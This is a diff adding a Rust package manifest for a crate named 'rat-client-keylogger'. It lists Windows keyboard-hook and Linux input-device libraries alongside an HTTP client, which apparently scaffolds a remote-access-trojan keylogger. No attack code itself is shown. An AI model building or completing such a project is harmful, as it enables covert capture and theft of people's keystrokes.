@@ -1,0 +1,13 @@
+[package]
+name = "rat-client-keylogger"
+version = "0.1.0"
+edition = "2024"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3.9", features = ["winuser", "libloaderapi", "minwindef", "winnt"] }
+
+[dependencies]
+evdev = "0.13.0"
+reqwest = "0.12.15"
+serde_json = "1.0.140"
+tokio = { version = "1.44.1", features = ["full"] }
